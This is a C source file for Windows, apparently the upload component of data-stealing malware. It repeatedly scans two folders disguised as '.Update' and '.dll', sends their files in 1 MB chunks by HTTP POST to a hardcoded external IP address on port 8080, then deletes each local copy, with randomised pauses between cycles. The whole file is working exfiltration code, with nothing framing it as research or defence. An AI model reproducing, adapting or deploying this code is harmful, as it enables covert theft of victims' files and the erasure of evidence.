// sender.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <time.h>
#include <direct.h>


#pragma comment(lib, "winhttp.lib")

#define SERVER_URL      L"144.172.84.133"
#define SERVER_PORT     8080
#define SERVER_PATH     L"/"

#define CHUNK_SIZE      (1024 * 1024) // 1 MB

void send_file(const wchar_t* filepath, const wchar_t* file_type) {
    FILE* fp = _wfopen(filepath, L"rb");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    size_t filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    size_t total_chunks = (filesize + CHUNK_SIZE - 1) / CHUNK_SIZE;
    wchar_t* filename = wcsrchr(filepath, L'\\');
    if (!filename) filename = (wchar_t*)filepath;
    else filename++;

    BYTE* buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(fp);
        return;
    }

    HINTERNET hSession = WinHttpOpen(L"SenderApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);

    for (size_t i = 0; i < total_chunks; i++) {
        DWORD to_read = CHUNK_SIZE;
        if ((i + 1) * CHUNK_SIZE > filesize)
            to_read = filesize - i * CHUNK_SIZE;

        fread(buffer, 1, to_read, fp);

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
                                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

        wchar_t seg_header[64], total_header[64];
        wchar_t headers[512];
        swprintf(seg_header, 64, L"%d", (int)i);
        swprintf(total_header, 64, L"%d", (int)total_chunks);
        swprintf(headers, 512,
            L"X-Filename: %s\r\n"
            L"X-File-Type: %s\r\n"
            L"X-Segment-Number: %s\r\n"
            L"X-Total-Segments: %s\r\n",
            filename, file_type, seg_header, total_header);

        WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        BOOL res = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      buffer, to_read, to_read, 0);
        if (res) WinHttpReceiveResponse(hRequest, NULL);
        else wprintf(L"Erreur HTTP: %s (%d)\n", filename, i);

        WinHttpCloseHandle(hRequest);
        Sleep(2); // pause douce
    }

    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    fclose(fp);
    free(buffer);

    _wremove(filepath);
    wprintf(L"Fichier supprimé: %s\n", filepath);
}

void send_dir(const wchar_t* dir_path) {
    WIN32_FIND_DATAW find_data;
    wchar_t pattern[MAX_PATH];
    swprintf(pattern, MAX_PATH, L"%s\\*", dir_path);
    HANDLE hFind = FindFirstFileW(pattern, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            wchar_t full_path[MAX_PATH];
            swprintf(full_path, MAX_PATH, L"%s\\%s", dir_path, find_data.cFileName);

            const wchar_t* file_type = (wcsstr(dir_path, L"Update") != NULL) ? L"Update" : L".dll";
            send_file(full_path, file_type);
        }
    } while (FindNextFileW(hFind, &find_data));
    FindClose(hFind);
}

DWORD WINAPI sender_thread(LPVOID lpParam) {
    int dir = *((int*)lpParam);
    const wchar_t* dir1 = L".Update";//png
    const wchar_t* dir2 = L".dll";//txt

    _wmkdir(dir1);
    _wmkdir(dir2);

    while (1) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        wprintf(L"[%.2d:%.2d:%.2d] Cycle d'envoi...\n", st.wHour, st.wMinute, st.wSecond);

        if (dir == 0){send_dir(dir1);}
        else {send_dir(dir2);}

        _wmkdir(dir1);
        _wmkdir(dir2);

        int pause = rand() % 6;
        wprintf(L"Pause %d sec...\n", pause);
        Sleep(pause * 1000);
    }
    return 0;
}
